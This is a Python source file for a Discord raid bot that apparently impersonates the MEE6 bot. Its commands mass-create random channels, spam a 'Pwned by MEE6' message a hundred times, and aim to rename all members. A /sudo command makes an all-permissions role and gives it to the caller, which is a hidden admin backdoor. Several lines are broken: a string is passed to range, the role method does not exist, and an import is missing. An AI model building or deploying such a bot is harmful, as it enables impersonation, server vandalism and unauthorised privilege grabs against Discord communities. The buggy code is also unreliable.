import discord
from discord import Webhook
import os
import requests
import aiohttp
import random

class mee6(discord.Client):
    async def on_ready(self):
        print("Ready!")
        

    async def on_member_join(member):
        print("joined: "+member.mention)



    async def on_message(self, message):
        if message.content.startswith('/raid'):
            currentguild = message.guild
            
            letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789.+-*/,?;.:/!§ù%*µ$£=)-"
            for i in range(2):
                result_str = ''.join(random.choice(letters) for i in range("8"))
                channel = await currentguild.create_text_channel(result_str)
                
            await message.delete()
            
            
        if message.content.startswith('/spam'):
            for i in range(100):
                await message.channel.send("Pwned by MEE6 :)")
            await message.delete()
            
            
        if message.content.startswith('/rename'):
            currentguild = message.guild
            print(currentguild.members)
            for name in currentguild.members:
                print("new user: "+name)
            await message.delete()
            
            
        if message.content.startswith('/sudo'):
            currentguild = message.guild
            role = await self.create_role(currentguild, name=" ˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞˞", permissions=Permissions.all())
            await message.author.add_roles(role)
            
            
            
        if message.content.startswith('/help'):
            await message.channel.send("""MEE6 commands help
- /help: get all commands
- /raid: create a lot of random channels
- /spam: spam a message in current channel
- /rename: rename everyone with random names
- /sudo: give yourself admin power""")
            await message.delete()

intents = discord.Intents.default()
intents.message_content = True
client = mee6(intents=intents)


client.run(os.environ['DISCORD_TOKEN'])
